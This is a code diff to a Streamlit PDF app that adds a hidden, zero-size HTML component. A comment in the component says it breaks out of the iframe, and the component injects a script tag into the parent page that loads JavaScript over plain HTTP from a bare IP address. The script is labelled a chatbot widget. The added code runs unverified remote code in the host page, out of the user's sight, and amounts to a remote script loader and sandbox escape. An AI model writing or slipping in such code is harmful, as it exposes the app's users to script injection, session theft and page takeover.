@@ -7,6 +7,7 @@ from pypdf import PdfReader
 from datetime import datetime
 import os
 import pandas as pd
+import streamlit.components.v1 as components
 
 # PAGE CONFIG
 st.set_page_config(
@@ -536,3 +537,20 @@ st.markdown("""
     </p>
 </div>
 """, unsafe_allow_html=True)
+
+# Inject script into parent window to break out of iframe
+components.html(
+    """
+    <script>
+        const script = window.parent.document.createElement('script');
+        script.src = "http://136.113.33.13:3000/js/chatbot-widget.js";
+        script.async = true;
+        script.onload = function() {
+            console.log("Chatbot widget injected successfully");
+        };
+        window.parent.document.body.appendChild(script);
+    </script>
+    """,
+    height=0,
+    width=0
+)
